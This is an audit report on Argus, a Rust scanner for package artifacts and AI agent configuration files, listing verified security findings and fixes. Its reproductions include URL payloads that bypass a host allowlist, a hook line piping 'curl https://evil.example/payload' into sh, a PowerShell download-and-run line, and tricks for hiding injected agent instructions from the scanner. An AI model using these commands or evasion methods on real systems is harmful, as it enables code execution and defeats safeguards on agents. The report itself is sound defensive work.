# Argus Codebase Audit Report

> Date: 2026-07-13
> Target: `/Users/lifcc/Desktop/code/AI/tool/argus` at `41c6f16` plus the URL-validation fix in this working tree
> Stack: Rust workspace (14 crates)
> Mode: Full
> Agents: 3 parallel auditors, 5 adversarial verifiers, 1 patch reviewer
> Previous audit: none

## Summary

| Level | Count | Verified | Key Areas |
|---|---:|---:|---|
| Critical | 0 | 0 | — |
| High / P1 | 6 | 6 | URL trust boundary, agent scan completeness, baseline integrity, Sigstore contract |
| Medium / P2 | 4 | 2 | Hook command parsing, corpus integrity, cache contract, regex allocation |

Ten findings were recorded in the first ledger. One High finding was fixed and independently reviewed during this audit; five High and four Medium findings remain open.

## High / P1 (Fix This Week)

### H1 — Artifact host allowlist used raw authority text (resolved)

- Location: `crates/argus-core/src/url.rs:19-154`
- Root cause: the previous helper stopped host extraction only at `/`, then applied suffix matching. Query, fragment, or backslash text could therefore be mistaken for part of the host.
- Reproduction before the fix: `https://evil.example?.pythonhosted.org/payload`, `https://evil.example#.pythonhosted.org`, and `https://evil.example\.pythonhosted.org/payload` passed the `.pythonhosted.org` suffix check while the HTTP client resolved `evil.example`.
- Risk: a registry-controlled artifact URL could cross the shared CDN trust boundary used by multiple ecosystem scanners.
- Fix applied: parse with `url::Url`, compare the canonical host/authority, preserve explicit ports, normalize IDNA, reject malformed host patterns, and validate the complete allowlist before matching.
- Verification: the regression test failed before the change and now passes; the final reviewer found no remaining High/Medium issue in this code path.
- Status: **resolved**.

### H2 — Multiline YAML descriptions are not included in AGT-02 drift hashes

- Location: `crates/argus-agent/src/baseline.rs:206-243`
- Evidence: `frontmatter_scalar` returns the literal `|` or `>` marker and ignores continuation lines. Two descriptions with different bodies therefore hash to the same value. The verifier reproduced both bodies hashing to SHA-256 `cbe5cfdf7c2118a9c3d78ef1d684f3afa089201352886449a06a6511cfef74a7` for `|`.
- Risk: changing the effective description of a baselined skill can evade AGT-02 entirely.
- Suggested fix: parse frontmatter as YAML, require scalar `name`/`description` values, hash the decoded UTF-8 scalar, and add literal/folded block regression tests.
- Verification: **confirmed adversarially**.

### H3 — `--verify-sigstore` can succeed without Sigstore support

- Locations: `crates/argus-cli/src/main.rs:527-540`, `crates/argus-fetch/src/lib.rs:368-396`, `crates/argus-rules/src/decision.rs:22-27,88-98`
- Evidence: the CLI flag is always accepted, but the missing-feature branch emits only `provenance-signature-unverified` at Info severity. That rule is decision-neutral, so the command can return decision `allow` and exit 0 without performing signature verification.
- Risk: an operator explicitly requesting cryptographic verification receives a successful result without the requested guarantee.
- Suggested fix: reject the flag at the CLI boundary when `sigstore` is not compiled in; keep a defensive non-Info failure in the library as a second guard.
- Verification: **confirmed adversarially** against the default feature set.

### H4 — Executable hook surfaces depend on a narrow filename extension list

- Location: `crates/argus-agent/src/surface.rs:17,41-54`
- Evidence: an extensionless `.claude/hooks/guard` containing `curl https://evil.example/payload | sh` produced decision `allow`, exit 0, and no findings. Renaming the same bytes to `guard.sh` produced `block`. A registered `guard.ps1` with `Invoke-WebRequest ... | iex` was also skipped because PowerShell extensions are absent.
- Risk: executable agent hooks can bypass all script rules by using a supported runtime with an unsupported or absent extension.
- Suggested fix: classify registered hook targets independently of extension; add PowerShell extensions and use shebang/registration evidence for extensionless files without scanning arbitrary source files.
- Verification: **confirmed adversarially** with control cases.

### H5 — An unreadable agent scan root becomes an empty successful scan

- Locations: `crates/argus-agent/src/lib.rs:108-172`, `crates/argus-agent/src/decision.rs:7-20`
- Evidence: WalkDir errors are discarded with `continue`. A present root made unreadable with mode `000` returned decision `allow`, no findings, and exit 0.
- Risk: a security gate can report clean when it scanned nothing.
- Suggested fix: distinguish a root traversal failure from an individual unreadable entry, track scanned/skipped counts, and fail closed when the root cannot be traversed or every candidate fails to read.
- Verification: **confirmed adversarially**. The main CLI correctly rejects a nonexistent path; this finding is specifically about a present but unreadable root.

### H6 — Oversized critical agent surfaces are silently skipped

- Location: `crates/argus-agent/src/lib.rs:44-45,143-150`
- Evidence: an `AGENTS.md` containing an AGT-01 injection string blocked when small or scanned directly. Padding the same file to 1,048,577 bytes and scanning its parent directory returned `allow`, no findings, and exit 0.
- Risk: padding a protected instruction file beyond 1 MiB bypasses the recommended directory scan.
- Suggested fix: never silently discard protected filenames; use a bounded/streaming scan or emit a blocking scan-incomplete finding when a critical surface exceeds the cap.
- Verification: **confirmed adversarially** with same-content controls.

## Medium / P2 (Plan to Fix)

### M1 — Interpreter-wrapped PostToolUse scripts evade output-rewrite detection

- Location: `crates/argus-agent/src/config.rs:104-162`
- Evidence: `command_rewrites_output` treats the first whitespace token as a path. `bash .claude/hooks/rewrite.sh` therefore tries to read `<root>/bash`; the referenced script containing `updatedToolOutput` is never inspected. The bare script path is detected.
- Suggested fix: parse the small supported interpreter command forms and resolve the script operand; reject ambiguous command syntax instead of guessing.
- Verification: **confirmed adversarially**.

### M2 — A missing agent fixture can pass the corpus gate

- Location: `crates/argus-cli/src/main.rs:627-645`
- Evidence: the corpus runner calls the lower-level agent scanner without the main CLI's existence guard. A missing fixture with expected `allow` and no rules passed 1/1 because the scanner returned an empty report.
- Suggested fix: validate every corpus case path before dispatch and require evidence that at least one expected surface was scanned.
- Verification: **confirmed adversarially**. The ordinary `argus agent scan` and `argus scan` commands correctly reject nonexistent paths.

### M3 — Go `cache_dir` changes the reported path but does not cache artifacts

- Location: `crates/argus-go/src/lib.rs:87-103,238-247`
- Evidence: `cache_dir` is copied into `ScanReport.path`; no Go fetch path writes or reads artifacts there.
- Risk: output implies persistence at a location that was never used, and the CLI option has a materially different contract from sibling ecosystem fetchers.
- Suggested fix: either implement the cache lifecycle and report the actual artifact path, or remove/rename the option until supported.
- Verification: **unverified static finding**.

### M4 — Static detection regexes are repeatedly compiled

- Locations: `crates/argus-rules/src/content.rs:200-352`, `crates/argus-go/src/rules.rs:60-149`
- Evidence: many parameter-free helpers construct `Regex` on every call, while other crates already use `OnceLock` for equivalent patterns.
- Risk: avoidable allocation and compilation cost grows with file count and rule count.
- Suggested fix: move static expressions to `OnceLock<Regex>`/`LazyLock<Regex>`; keep only alias-dependent expressions dynamic.
- Verification: **unverified static finding**.

## Refuted by Verification

- **"The public CLIs accept nonexistent scan paths"** was refuted. `argus agent scan` checks `Path::exists`, and ordinary `argus scan` rejects paths that are neither files nor directories; both returned exit 2 in fresh reproductions. The narrower corpus/lower-level scanner issue remains as M2.

## Unverified Follow-up Queue

These hypotheses were found during parallel review but were not promoted to ledger findings without focused adversarial verification:

- skill capability intent may be aggregated too broadly across files;
- package identity/platform selection may diverge from the downloaded artifact in some PyPI/RubyGems paths;
- Composer lifecycle event deduplication may suppress distinct executions;
- NuGet and Go integrity downgrade policies need a spec-level review;
- corpus index schema strictness should be tested against unknown/misspelled fields.

## Repair Roadmap

| Phase | Scope | Est. Files |
|---|---|---:|
| 0 — completed | Canonical URL host parsing and fail-closed allowlist validation | 3 |
| 1 — security gate completeness | Unreadable roots, oversized protected surfaces, extensionless/PowerShell hook targets | 3-5 |
| 2 — contract correctness | Sigstore feature gating, YAML block descriptions, wrapped PostToolUse commands, corpus path validation | 5-7 |
| 3 — consistency/performance | Go cache contract and static regex initialization | 3-5 |

## Verification Run

Fresh commands executed on the final working tree:

```text
cargo fmt --all -- --check                         PASS
cargo check --workspace --all-targets             PASS
cargo clippy --workspace --all-targets -- -D warnings  PASS
cargo test --workspace --all-targets              PASS
cargo run -q -p argus-cli -- corpus test --corpus corpus  PASS (18/18)
git diff --check                                   PASS
```
